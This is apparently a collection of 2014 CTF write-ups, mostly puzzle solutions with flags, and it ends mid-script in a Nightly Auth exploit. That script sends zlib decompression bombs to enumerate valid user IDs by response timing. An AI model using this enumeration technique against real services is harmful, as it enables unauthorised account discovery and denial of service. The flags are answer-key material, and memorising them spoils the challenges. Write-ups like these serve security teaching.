agUAZAoAZAQAgwIAYQQAdAQAagYAZAsAgwEAYQQAZAwAZQEAdAQAgwEAagcAgwAAF2EEAG4AAGQN
AFMoDgAAAGn/////KAEAAABzBAAAAHNoYTEoAQAAAHMGAAAAZ2V0ZW52cwsAAABOT19DT05fTkFN
RXMAAAAAcwEAAABZczEAAAAgNTcgNjggNjEgNzQgMjAgNjkgNzMgMjAgNzQgNjggNjUgMjAgNjEg
NjkgNzIgMmQgczEAAAAgNzMgNzAgNjUgNjUgNjQgMjAgNzYgNjUgNmMgNmYgNjMgNjkgNzQgNzkg
MjAgNmYgczEAAAAgNjYgMjAgNjEgNmUgMjAgNzUgNmUgNmMgNjEgNjQgNjUgNmUgMjAgNzMgNzcg
NjEgcxAAAAAgNmMgNmMgNmYgNzcgM2YgcwEAAAAgcwMAAABoZXhzAwAAAE5DTk4oCAAAAHMHAAAA
aGFzaGxpYnMEAAAAc2hhMXMCAAAAb3NzBgAAAGdldGVudnMEAAAAZmxhZ3MHAAAAcmVwbGFjZXMG
AAAAZGVjb2RlcwkAAABoZXhkaWdlc3QoAAAAACgAAAAAKAAAAABzCAAAADxzdHJpbmc+cwgAAAA8
bW9kdWxlPgIAAABzEgAAABABEAEVAgYBCgEKAQoBEgEPAQ==
"""

if __name__ != "__main__":
    codeobj = marshal.loads(bytecode)
    f = new.function(codeobj, globals(), "f", None, None)

f()

print flag
```

The first two lines are wrong, but it doesn't matter, the script will run anyway.

So, first there are a couple of imports, then a global variable called "flag" is defined (we'll assume the flag will be there at some point), a function called "f" sets it as "Nope!", thereś another variable called "bytecode" with some binary data, a block of code that can only be executed when importing the module (not when running it as a script), then the "f" function is called and the "flag" variable is printed out.

Clearly the key part here is the binary blob and the conditional block. Let's run the script as an imported module to get into the conditional block:

```
$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import ctf_decoded.py
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "ctf_decoded.py", line 26, in <module>
    codeobj = marshal.loads(bytecode)
ValueError: bad marshal data (unknown type code)
>>>
```

Now we're getting a different error message. Let's take a closer look at that conditional block. We see the variable "bytecode" is decoded using the "marshal" module, we now we know that blob contains Python serialized data. Next a new function is created in runtime using the data from the blob, hence the name of the variable "bytecode" - the blob is Python bytecode. But this cannot work, the blob seems to be encoded using base64. Let's fix the script by changing this line:

```
    codeobj = marshal.loads(bytecode)
```

To this:

```
    codeobj = marshal.loads(bytecode.decode("base64"))
```

And run it again:

```
>>> import ctf_decoded
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "ctf_decoded.py", line 31, in <module>
    print flag
NameError: global name 'flag' is not defined
```

Something else is broken! This time we'll have to look at that mystery bytecode, for which we have no sources. But we have the "dis" module to disassemble the bytecode, it comes with Python itself.


```
>>> bytecode = """
... YwAAAAAAAAAAAwAAAEAAAABzlwAAAGQAAGQBAGwAAG0BAFoBAAFkAABkAgBsAgBtAwBaAwABZQMA
... ZAMAZAQAgwIAZAUAawIAcpMAZAYAYQQAdAQAZAcAN2EEAHQEAGQIADdhBAB0BABkCQA3YQQAdAQA
... agUAZAoAZAQAgwIAYQQAdAQAagYAZAsAgwEAYQQAZAwAZQEAdAQAgwEAagcAgwAAF2EEAG4AAGQN
... AFMoDgAAAGn/////KAEAAABzBAAAAHNoYTEoAQAAAHMGAAAAZ2V0ZW52cwsAAABOT19DT05fTkFN
... RXMAAAAAcwEAAABZczEAAAAgNTcgNjggNjEgNzQgMjAgNjkgNzMgMjAgNzQgNjggNjUgMjAgNjEg
... NjkgNzIgMmQgczEAAAAgNzMgNzAgNjUgNjUgNjQgMjAgNzYgNjUgNmMgNmYgNjMgNjkgNzQgNzkg
... MjAgNmYgczEAAAAgNjYgMjAgNjEgNmUgMjAgNzUgNmUgNmMgNjEgNjQgNjUgNmUgMjAgNzMgNzcg
... NjEgcxAAAAAgNmMgNmMgNmYgNzcgM2YgcwEAAAAgcwMAAABoZXhzAwAAAE5DTk4oCAAAAHMHAAAA
... aGFzaGxpYnMEAAAAc2hhMXMCAAAAb3NzBgAAAGdldGVudnMEAAAAZmxhZ3MHAAAAcmVwbGFjZXMG
... AAAAZGVjb2RlcwkAAABoZXhkaWdlc3QoAAAAACgAAAAAKAAAAABzCAAAADxzdHJpbmc+cwgAAAA8
... bW9kdWxlPgIAAABzEgAAABABEAEVAgYBCgEKAQoBEgEPAQ==
... """
>>> import marshal
>>> import dis
>>> codeobj = marshal.loads(bytecode.decode("base64"))
>>> dis.disassemble(codeobj)
  2           0 LOAD_CONST               0 (-1)
              3 LOAD_CONST               1 (('sha1',))
              6 IMPORT_NAME              0 (hashlib)
              9 IMPORT_FROM              1 (sha1)
             12 STORE_NAME               1 (sha1)
             15 POP_TOP

  3          16 LOAD_CONST               0 (-1)
             19 LOAD_CONST               2 (('getenv',))
             22 IMPORT_NAME              2 (os)
             25 IMPORT_FROM              3 (getenv)
             28 STORE_NAME               3 (getenv)
             31 POP_TOP

  4          32 LOAD_NAME                3 (getenv)
             35 LOAD_CONST               3 ('NO_CON_NAME')
             38 LOAD_CONST               4 ('')
             41 CALL_FUNCTION            2
             44 LOAD_CONST               5 ('Y')
             47 COMPARE_OP               2 (==)
             50 POP_JUMP_IF_FALSE      147

  6          53 LOAD_CONST               6 (' 57 68 61 74 20 69 73 20 74 68 65 20 61 69 72 2d ')
             56 STORE_GLOBAL             4 (flag)

  7          59 LOAD_GLOBAL              4 (flag)
             62 LOAD_CONST               7 (' 73 70 65 65 64 20 76 65 6c 6f 63 69 74 79 20 6f ')
             65 INPLACE_ADD
             66 STORE_GLOBAL             4 (flag)

  8          69 LOAD_GLOBAL              4 (flag)
             72 LOAD_CONST               8 (' 66 20 61 6e 20 75 6e 6c 61 64 65 6e 20 73 77 61 ')
             75 INPLACE_ADD
             76 STORE_GLOBAL             4 (flag)

  9          79 LOAD_GLOBAL              4 (flag)
             82 LOAD_CONST               9 (' 6c 6c 6f 77 3f ')
             85 INPLACE_ADD
             86 STORE_GLOBAL             4 (flag)

 10          89 LOAD_GLOBAL              4 (flag)
             92 LOAD_ATTR                5 (replace)
             95 LOAD_CONST              10 (' ')
             98 LOAD_CONST               4 ('')
            101 CALL_FUNCTION            2
            104 STORE_GLOBAL             4 (flag)

 11         107 LOAD_GLOBAL              4 (flag)
            110 LOAD_ATTR                6 (decode)
            113 LOAD_CONST              11 ('hex')
            116 CALL_FUNCTION            1
            119 STORE_GLOBAL             4 (flag)

 12         122 LOAD_CONST              12 ('NCN')
            125 LOAD_NAME                1 (sha1)
            128 LOAD_GLOBAL              4 (flag)
            131 CALL_FUNCTION            1
            134 LOAD_ATTR                7 (hexdigest)
            137 CALL_FUNCTION            0
            140 BINARY_ADD
            141 STORE_GLOBAL             4 (flag)
            144 JUMP_FORWARD             0 (to 147)
        >>  147 LOAD_CONST              13 (None)
            150 RETURN_VALUE
```

This looks like an important part:

```
  3          16 LOAD_CONST               0 (-1)
             19 LOAD_CONST               2 (('getenv',))
             22 IMPORT_NAME              2 (os)
             25 IMPORT_FROM              3 (getenv)
             28 STORE_NAME               3 (getenv)
             31 POP_TOP

  4          32 LOAD_NAME                3 (getenv)
             35 LOAD_CONST               3 ('NO_CON_NAME')
             38 LOAD_CONST               4 ('')
             41 CALL_FUNCTION            2
             44 LOAD_CONST               5 ('Y')
             47 COMPARE_OP               2 (==)
             50 POP_JUMP_IF_FALSE      147
```

This piece of code is the equivalent of something more or less like this:

```
    from os import getenv
    if getenv('NO_CON_NAME') == 'Y':
        # rest of the code...
```

Meaning we need to set the environment variable "NO_CON_NAME" to the value "Y" to get the script to work.

```
$ NO_CON_NAME=Y python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import ctf_decoded
NCN6ceeeff26e72a40b71e6029a7149ad0626fcf310
```

And we finally get the right flag. :)

An alternate (shorter?) way to solve it without disassembling the Python bytecode is to just look at it in hex and try to figure out what it does:

```
>>> bytecode = """
... YwAAAAAAAAAAAwAAAEAAAABzlwAAAGQAAGQBAGwAAG0BAFoBAAFkAABkAgBsAgBtAwBaAwABZQMA
... ZAMAZAQAgwIAZAUAawIAcpMAZAYAYQQAdAQAZAcAN2EEAHQEAGQIADdhBAB0BABkCQA3YQQAdAQA
... agUAZAoAZAQAgwIAYQQAdAQAagYAZAsAgwEAYQQAZAwAZQEAdAQAgwEAagcAgwAAF2EEAG4AAGQN
... AFMoDgAAAGn/////KAEAAABzBAAAAHNoYTEoAQAAAHMGAAAAZ2V0ZW52cwsAAABOT19DT05fTkFN
... RXMAAAAAcwEAAABZczEAAAAgNTcgNjggNjEgNzQgMjAgNjkgNzMgMjAgNzQgNjggNjUgMjAgNjEg
... NjkgNzIgMmQgczEAAAAgNzMgNzAgNjUgNjUgNjQgMjAgNzYgNjUgNmMgNmYgNjMgNjkgNzQgNzkg
... MjAgNmYgczEAAAAgNjYgMjAgNjEgNmUgMjAgNzUgNmUgNmMgNjEgNjQgNjUgNmUgMjAgNzMgNzcg
... NjEgcxAAAAAgNmMgNmMgNmYgNzcgM2YgcwEAAAAgcwMAAABoZXhzAwAAAE5DTk4oCAAAAHMHAAAA
... aGFzaGxpYnMEAAAAc2hhMXMCAAAAb3NzBgAAAGdldGVudnMEAAAAZmxhZ3MHAAAAcmVwbGFjZXMG
... AAAAZGVjb2RlcwkAAABoZXhkaWdlc3QoAAAAACgAAAAAKAAAAABzCAAAADxzdHJpbmc+cwgAAAA8
... bW9kdWxlPgIAAABzEgAAABABEAEVAgYBCgEKAQoBEgEPAQ==
... """
>>> print repr(bytecode.decode("base64"))
'c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x97\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00m\x01\x00Z\x01\x00\x01d\x00\x00d\x02\x00l\x02\x00m\x03\x00Z\x03\x00\x01e\x03\x00d\x03\x00d\x04\x00\x83\x02\x00d\x05\x00k\x02\x00r\x93\x00d\x06\x00a\x04\x00t\x04\x00d\x07\x007a\x04\x00t\x04\x00d\x08\x007a\x04\x00t\x04\x00d\t\x007a\x04\x00t\x04\x00j\x05\x00d\n\x00d\x04\x00\x83\x02\x00a\x04\x00t\x04\x00j\x06\x00d\x0b\x00\x83\x01\x00a\x04\x00d\x0c\x00e\x01\x00t\x04\x00\x83\x01\x00j\x07\x00\x83\x00\x00\x17a\x04\x00n\x00\x00d\r\x00S(\x0e\x00\x00\x00i\xff\xff\xff\xff(\x01\x00\x00\x00s\x04\x00\x00\x00sha1(\x01\x00\x00\x00s\x06\x00\x00\x00getenvs\x0b\x00\x00\x00NO_CON_NAMEs\x00\x00\x00\x00s\x01\x00\x00\x00Ys1\x00\x00\x00 57 68 61 74 20 69 73 20 74 68 65 20 61 69 72 2d s1\x00\x00\x00 73 70 65 65 64 20 76 65 6c 6f 63 69 74 79 20 6f s1\x00\x00\x00 66 20 61 6e 20 75 6e 6c 61 64 65 6e 20 73 77 61 s\x10\x00\x00\x00 6c 6c 6f 77 3f s\x01\x00\x00\x00 s\x03\x00\x00\x00hexs\x03\x00\x00\x00NCNN(\x08\x00\x00\x00s\x07\x00\x00\x00hashlibs\x04\x00\x00\x00sha1s\x02\x00\x00\x00oss\x06\x00\x00\x00getenvs\x04\x00\x00\x00flags\x07\x00\x00\x00replaces\x06\x00\x00\x00decodes\t\x00\x00\x00hexdigest(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<string>s\x08\x00\x00\x00<module>\x02\x00\x00\x00s\x12\x00\x00\x00\x10\x01\x10\x01\x15\x02\x06\x01\n\x01\n\x01\n\x01\x12\x01\x0f\x01'
```

We can clearly see the strings "getenv", "NCN" and "NO_CON_NAME", but "Y" is tougher to find. However, we can see other interesting strings like "hex", "sha1" and "hexdigest", and something else that looks a lot like a hex dump:

```
    57 68 61 74 20 69 73 20 74 68 65 20 61 69 72 2d
    73 70 65 65 64 20 76 65 6c 6f 63 69 74 79 20 6f
    66 20 61 6e 20 75 6e 6c 61 64 65 6e 20 73 77 61
    6c 6c 6f 77 3f
```

If we decode the hex dump we get this ASCII string:

```
    What is the air-speed velocity of an unladen swallow?
```

So it's not hard to guess we need to calculate the flag, since we know other flags in the quals look like "NCN"+hash(something), so we try this:

```
>>> import hashlib
>>> "NCN"+hashlib.sha1('What is the air-speed velocity of an unladen swallow?').hexdigest()
'NCN6ceeeff26e72a40b71e6029a7149ad0626fcf310'
```

## Other write-ups and resources

* <http://ctfcrew.org/writeup/65>)
* <http://v0ids3curity.blogspot.in/2014/09/no-con-name-ctf-quals-2014-immiscible.html>
# NoConName 2014 Quals: MakeMeFeeWet^HB

**Category:** Web
**Points:** 300
**Description:**

Access == Flag

## Write-up

<http://blogs.tunelko.com/2014/09/15/makemefeewethb-no-con-name-2014-ctf-quals/>

Flag: `NcN_778064be6556e64577517875a8710b0abeba1578`

## Other write-ups and resources

* <http://www.incertia.net/blog/noc0nname-quals-2014-makemefeewethb-300/>
# NoConName 2014 Quals: MISCall

**Category:** Misc
**Points:** 100
**Description:**

No hints :( just go and get the flag.

## Write-up

(Here's a shorter writeup by the Balalaika crew: <http://ctfcrew.org/writeup/67>)

First let's determine the file type...

```
$ file ctf
ctf: bzip2 compressed data, block size = 900k
```

It's a bzip2 compressed archive, let's decompress it and try again.

```
$ mv ctf ctf.bz2
$ bzip2 -d ctf.bz2
$ file ctf
ctf: POSIX tar archive (GNU)
```

So there's a tar file in it. Let's unpack it.

```
$ mv ctf ctf.tar
$ tar -xf ctf.tar
```

A new directory was created.

```
$ cd ctf
$ ls ctf
flag.txt
```

Can't be that easy, right?

```
$ cat flag.txt
Nothing to see here, moving along...
```

Nope, not so easy ;)

Let's take a closer look...

```
$ ls -a
.  ..  flag.txt  .git
```

Aha! It's a Git repository. This looks better. Let's look at the commit log...

```
$ git log
commit bea99b953bef6cc2f98ab59b10822bc42afe5abc
Author: Linus Torvalds <torvalds@klaava.Helsinki.Fi>
Date:   Thu Jul 24 21:16:59 2014 +0200

    Initial commit
```

Not much to see here, just one commit with the file we've already seen. But the repo is a bit too big to contain only this, there must be something else hidden here. The two obvious locations are the branches and the stash.

```
$ git stash show
 flag.txt |   25 ++++++++++++++++++++++++-
 s.py     |    4 ++++
 2 files changed, 28 insertions(+), 1 deletion(-)
```

Gotcha! Let's recover the files.

```
$ git stash apply
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#	new file:   s.py
#
# Changes not staged for commit:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#	modified:   flag.txt
#
```

Now flag.txt has a completely different content, it's the mythical email sent by Linus Torvalds announcing the Linux kernel in comp.os.minix. We can also find a Python script with the following contents:

```
$ cat s.py
#!/usr/bin/env python
from hashlib import sha1
with open("flag.txt", "rb") as fd:
    print "NCN" + sha1(fd.read()).hexdigest()
```

So this just calculates the SHA1 hash from flag.txt. We run it and get the flag:

```
$ ./s.py
NCN4dd992213ae6b76f27d7340f0dde1222888df4d3
```

## Other write-ups and resources

* <http://www.incertia.net/blog/noc0nname-quals-2014-miscall-100/>
* <https://ctfcrew.org/writeup/67>
# NoConName 2014 Quals: proMISCuous

**Category:** Misc
**Points:** 300
**Description:**

Connect to the service and get the key. The flag is: "NcN_" + sha1sum(key)

## Write-up

<http://blog.st3phn.com/2014/09/noconname-ctf-quals-2014-promiscuous.html>

Flag: NcN_15d07db12cd83174f0d19ce7e8c65a7c5ffba7df
# NoConName 2014 CTF Quals write-ups

* [Scoreboard](https://ctftime.org/event/158) or [local alternative](scoreboard.txt)
* Several writeups in Spanish: <http://blog.ka0labs.net/post/17/>

## Completed write-ups

* [MISCall](MISCall)
* [inMISCible](inMISCible)

## External write-ups only

* [CRYPTonite](CRYPTonite)
* [MakeMeFeeWet](MakeMeFeeWet)
* [STEGOsaurus](STEGOsaurus)
* [WEBster](WEBster)
* [cannaBINoid](cannaBINoid)
* [eXPLicit](eXPLicit)
* [inBINcible](inBINcible)
* [proMISCuous](proMISCuous)

## Missing write-ups

* none yet
# NoConName 2014 Quals: STEGOsaurus

**Category:** Steganography
**Points:** 300
**Description:**

Can you hear it? Sounds like a flag... Note: The flag only contains lowercase characters.

## Write-up

* <http://givemesecurity.info/2014/09/14/stegosaurus-writeup/>
* <http://www.mrt-prodz.com/blog/view/2014/09/no-con-name-ctf-quals-2014---stegosaurus-300pts-writeup>
* <http://eindbazen.net/2014/09/no-con-name-ctf-stegosaurus/>

Flag: NCN3cbfdcc8d7a257d8062560e88dd7d7fd65dc647a

## Other write-ups and resources

* <http://www.incertia.net/blog/noc0nname-quals-2014-stegosaurus-300/>
# NoConName 2014 Quals: WEBster

**Category:** Web
**Points:** 200
**Description:**

Super secure cloud service.

## Write-up

<http://blogs.tunelko.com/2014/09/15/webster-no-con-name-2014-ctf-quals/>

Flag: `NCN_f528764d624db129b32c21fbca0cb8d6`

## Other write-ups and resources

* <http://www.incertia.net/blog/noc0nname-quals-2014-webster-200/>
# NotSoSecure CTF 2014: Flag 1

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.justinsteven.com/posts/2014/04/21/notsosecures-2nd-sqlilab-ctf-writeup/>
* <http://tasteless.eu/2014/04/notsosecure-ctf-2014-writeups/>
* [Chinese](http://atdog.logdown.com/posts/2014/04/20/notsosecure-ctf-write-ups)
# NotSoSecure CTF 2014: Flag 2

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.justinsteven.com/posts/2014/04/21/notsosecures-2nd-sqlilab-ctf-writeup/>
* <http://tasteless.eu/2014/04/notsosecure-ctf-2014-writeups/>
* [Chinese](http://atdog.logdown.com/posts/2014/04/20/notsosecure-ctf-write-ups)
# NotSoSecure CTF 2014

* [Main website](http://ctf.notsosecure.com/)
* [@NotSoSecure on Twitter](https://twitter.com/NotSoSecure)

## Completed write-ups

* none yet

## External write-ups only

* [Flag 1](flag-1)
* [Flag 2](flag-2)

## Missing write-ups

* none yet
# Nuit du Hack CTF Qualifications: Abitbol

**Category:** Web
**Points:** 100
**Description:**

> Hah! Check out this website that I found.. Such obvious vulnerabilities! The admin is really dumb too.
>
> http://abitbol.nuitduhack.com/

## Write-up

(TODO)

The flag is `IJustTookaHUGEMySQLDUMP`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-web-write-ups/>
* <http://tasteless.eu/2014/04/nuit-du-hack-ctf-quals-2014-web100-and-web300-writeup/>
# Nuit du Hack CTF Qualifications: Another One

**Category:** Crypto
**Points:** 300
**Description:**

> This is a crypted image, you must extract the data.
>
> [`crypted.bmp`](crypted.bmp)

## Write-up

(TODO: figure out it’s ECB)

This challenge can easily be solved using [ElectronicColoringBook](https://doegox.github.io/ElectronicColoringBook/):

```bash
$ python ElectronicColoringBook.py --flip crypted.bmp
fb5ea1b7895c5e8da75a0ddf0300fe3b     225062 #00 -> #FF #FF #FF
6cdad40fdd970f8acb9fa6647098c452      15709 #7D -> #28 #CC #C0
bbec27cf5e0d0e9de65d06481ee26a9a        928 #42 -> #74 #CC #28
75d1d120fe5d9e605e0e25a2d2a1928f        750 #AA -> #28 #2A #CC
3bca008436fe1eec6254de08293fe33f        588 #A6 -> #28 #39 #CC
820a02cb1f0191f757c95f17eae02e16        227 #58 -> #28 #CC #31
4aa8547d6336592ca6d22fe06a580527        148 #58 -> #28 #CC #31
f77a3852a26c3e3e65504f88293ed1eb        146 #17 -> #CC #7D #28
adf3ba50c7601c792e2303a3171dd902        145 #D3 -> #C5 #28 #CC
a8c0e892b95002c5cadbb48bd0f6d926        110 #82 -> #28 #C4 #CC
879da25d13e929773097dd8586dbf652        104 #8E -> #28 #96 #CC
7e1e4cca7b5c22392267cc23732b558f        103 #FC -> #CC #28 #34
2f3717c1ea26ab6d7273d66c7da36c8f         89 #5E -> #28 #CC #48
4c5eb6b2e6d4e2a0aa31d972d5d406cb         82 #E8 -> #CC #28 #81
734bc30ba09aa6a3a44935011ac2f27e         81 #6C -> #28 #CC #7E
********************************      25732 #FF -> #00 #00 #00
Trying to guess ratio between 1:3 and 3:1 ...
Width: from 692 to 6234
Sampling: 1000
Progress: 700 800 900 1000 1100 1200 1300 1400 1500 1600 1700 1800 1900 2000 2100 2200 2300 2400 2500 2600 2700 2800 2900 3000 3100 3200 3300 3400 3500 3600 3700 3800 3900 4000 4100 4200 4300 4400 4500 4600 4700 4800 4900 5000 5100 5200 5300 5400 5500 5600 5700 5800 5900 6000 6100 6200
Size:  (4800, 900)
```

The flag is `AllMyLifeIThoughtAirWasFreeUntilIBoughtABagOfChips`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/04/nuit-du-hack-quals-another-one-writeup.html>
* <http://wiki.yobi.be/wiki/NDH_Writeups#Another_One>
# Nuit du Hack CTF Qualifications: Big Momma

**Category:** Miscellaneous
**Points:** 200
**Description:**

> Steve programmed a service to authenticate him for administration purposes, take control... IP: 54.217.202.218 Port: 3000
>
> [`bigmomma.tar`](bigmomma.tar)

## Write-up

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#bigmomma>
* <http://tasteless.eu/2014/04/nuit-du-hack-ctf-quals-2014-misc150-and-misc200-writeup/>
# Nuit du Hack CTF Qualifications: Carbonara

**Category:** Crypto
**Points:** 50
**Description:**

> I'm craving some italian.. How about you?
>
> [`Carbonara.txt`](Carbonara.txt)

## Write-up

[The provided text file](Carbonara.txt) has the following contents:

```
%96 7=28 7@C E9:D 492= :D iQx>A6C2E@C xF=:FD r26D2C s:GFDQ]
```

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#carbonara>
* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-crypto-write-ups/>
* <http://fadec0d3.blogspot.de/2014/04/nuit-du-hack-quals-ctf-writeup-2014.html>
# Nuit du Hack CTF Qualifications: Data extraction

**Category:** Forensics
**Points:** 300
**Description:**

> On a machine infected by Jupiter malware, some documents were transfered through the network
>
> [`Jupiter.pcap`](Jupiter.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* <https://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fforum.reverse4you.org%2Fshowthread.php%3Ft%3D1678>
# Nuit du Hack CTF Qualifications: GodMode

**Category:** Steganalysis
**Points:** 100
**Description:**

> Data was hidden in this image. Your goal is to extract them

## Write-up

(TODO)

## Other write-ups and resources

* <http://dem0version.wordpress.com/2012/03/14/hello-world/>
# Nuit du Hack CTF Qualifications: Here, kitty kitty!

**Category:** Steganalysis
**Points:** 50
**Description:**

> I just can't get enough of this sweet melody, I can listen to it for hours! Sometimes I even feel like it is trying to send me a message ..
>
> [`HelloKittyKitty.wav`](HelloKittyKitty.wav)

## Write-up

Opening the file in a sound editor like Audacity reveals that the left audio channel contains something special:

![](screenshot.png)

It looks like a morse code. Let’s type it out:

```
..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.
```

According to [an online morse decoder](http://morsecode.scphillips.com/jtranslator.html), this translates to:

```
5BC925649CB0188F52E617D70929191C
```

I tried entering this as the flag but it was not accepted. Googling for it [reveals](http://md5.gromweb.com/?md5=5bc925649cb0188f52e617d70929191c) that `5bc925649cb0188f52e617d70929191c` (in lowercase) is the MD5 hash of the string `valar dohaeris`.

The correct flag was `5bc925649cb0188f52e617d70929191c` (in lowercase).

## Other write-ups and resources

* <http://csrc.tamuc.edu/css/?p=143>
* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#here-kitty-kitty>
# Nuit du Hack CTF Qualifications: Nibble

**Category:** Miscellaneous
**Points:** 600
**Description:**

> Check out our new chat server! We GUARANTEE that it is unhackable. Seriously.
>
> Resources: [`NibblesClient.tar.gz`](NibblesClient.tar.gz)
>
> Target server IP address: 54.217.202.218
>
> [`NibbleServer`](NibbleServer)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/04/nuit-du-hack-ctf-quals-2014-nibble.html>
# Nuit du Hack CTF Qualifications: Nightly Auth

**Category:** Miscellaneous

**Points:** 400

**Description:**
> Your goal is to authenticate to the service IP: 54.217.202.218 Port: 1337
>
> [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz)

## Write-up

The provided [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz) file contains parts of the source code for a server-side script and a client.

The server reads the client data until it sends a packet ending with `\x45\x4f\x53` (EOS).

```python
while line[-3:] != "\x45\x4f\x53":
  data = socket.recv(1024)
  if not data:
    break
  line += data
  cur_data += 1
  # If the client have sent too much packets, kick it.
  if cur_data >= max_data:
    kick_notice(socket,"Too much data.")
    line = ""
    break
if line:
  print("[~] Checking token.")
  auth_class.check_token(line)
```

After receiving all the client data, the server checks if the supplied username is valid.

```python
def check_token(self,token):
  print("[~] Processing token...")
  # Split the data and check the opcode.
  data = re.split(regexsplitter, token)
  if data[0] == "1":
    print("[+] TOKEN_REQUEST !")
    # Check if the user is valid...
    if check_username(data[1]):
      print("[+] Valid UserID :)")
      # Generate a token for the client.
      self.process(data)
    else:
      print("[!] Bad UserID...")
      self.fail()
  elif data[0] == "2":
    print("[+] AUTH_REQUEST !")
    self.process(data)
```

Let’s take a look at the client.

```python
  def token_packet(self,uid,pwd):
      print("[~] Sending TOKEN Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, pwd))

  def auth_packet(self,uid,pwd,token):
      print("[~] Sending AUTH Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, pwd, token))

  def get_challenge(self):
    s = self.make_socket()
    s.sendall(self.token_packet(self.uid,self.pwd))
    data = s.recv(1024)
    self.nonce = data
    print("Got new challenge. Len: %s" % len(self.nonce))
    s.close()

  def auth(self):
    print("[~] Sending with new challenge...")
    s = self.make_socket()
    s.sendall(self.auth_packet(self.uid,self.pwd,self.nonce))
    print("Server response: %s" % s.recv(1024))
    s.close()

if __name__ == "__main__":
  print("Client started.")
  auth = Authentification()
  auth.set_credentials("1","password")
  auth.get_challenge()
  auth.auth()
```

1. The client first sends a `get_challenge` (Opcode: 1) request, with an UID and a password.
2. The server answers with a token. The size differs with every packet.
3. The client sends an `auth_packet` (Opcode: 2) with the same UID, the same password and the token sent by the server.

After trying the client with username `1`, the server sent me a token. The same thing happened for username `2`. It seems that even if the username is invalid, the server always sends a token. So we can’t guess if the username is valid or not based on the token…

The server had a problem with **load balancing**: after our first `get_challenge` request, the `auth_packet` was redirected to another server. That wasn’t a problem for exploiting, we just had to sent the `auth_packet` five times until we hit the right server (round-robin and 5 servers).

Let’s take a look at the `process()` function…

```python
def process(self,data):
  if data[3] != "EOS": #If it's not an TOKEN Request, decompress the current token token.
    print("[~] Decompressing the token...")
    token = decompress(data[3])
  if data[0] == "1": # If it's a token request, create and sent a new token.
    print("[TOKEN_REQUEST] Generating a valid token...")
    self.send_token(data[1],data[2])
    return True
  if token:
    print("[AUTH_REQUEST] Verifying the token...")
    time.sleep(3) # Sleep for blocking bruteforce attacks.
    if self.token_verifier.verify(token,data[1],data[2]):
      AuthSuccess()
      return True
    else:
      AuthFail()
      return False
```

Looking at the client code, we can see user data is separated with `\x02\x01\x02\x01`.

In the `process` function, called only if the username is valid, we can see that the server is checking if `data[3]` contains `EOS`, if not it decompresses the token. That means that if we send a `get_challenge` packet (Opcode 1), with a **fourth field** (a token), it will **decompress** this field and will not go to `time.sleep(3) # Sleep for blocking bruteforce attacks`!

**Decompressing data can take time**, and because **`process()` is only called when a user is valid**, we can guess if the username is valid by looking at the response time. Let’s try to exploit this flaw!

First of all, we have to guess which username is valid… This little exploit will help you.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'nightlydev <n.chatelain[at]sysdream.com>'
from timeit import default_timer
from zlib import compress, decompress
import socket
from numpy import mean
import time

class TimingAttack:
  def __init__(self,target):
    self.payload = None
    self.bombtimer = None
    self.target = target
    # We generate a ZIP Bomb to make the server lag.
    self.generate_exploit()
    print("[~] Timing attack ready.")

  def generate_exploit(self):
    # We compress a lot of "zeroes", small payload to send, but can take some time to decompress :) !
    print("[~] Generating bomb...")
    start = default_timer()
    self.payload = compress('0'*40000000)
    stop = default_timer()
    print("[+] Bomb generated - Took: %f to compress." % (stop - start))
    time.sleep(1)
    # We try to decompress the payload, which will be used as a trigger
    start = default_timer()
    decompress(self.payload)
    stop = default_timer()
    self.bombtimer = (stop - start)/2 # You have to adjust this offset if you have a lot of false positives
    print("[+] Bomb test - Time offset set: %f." % self.bombtimer)

  def create_socket(self):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(self.target)
    return s

  def avg_timer(self):
    # We first need to get the average response time of the server.
    timers = []
    sock = self.create_socket()
    for x in range(0,50):
      took = self.send_exploit(x)
      timers.append(took)
    print("[~] Average response time: %f" % mean(timers))
    # When a response is higher than the trigger, this may be caused by a decompression.
    self.trigger = mean(timers)+self.bombtimer

  def bruteforce(self,max_uids=10000):
    print("[~] Sending TOKEN probes...")
    start = default_timer()
    # We try to determine which usernames are valid.
    for userid in range(1,max_uids+1):
      current = (float(userid)/max_uids)*100
      timer = self.send_exploit(userid)
      print('[~] Uid: %d took: %f (%d%% completed)' % (userid,timer,current))
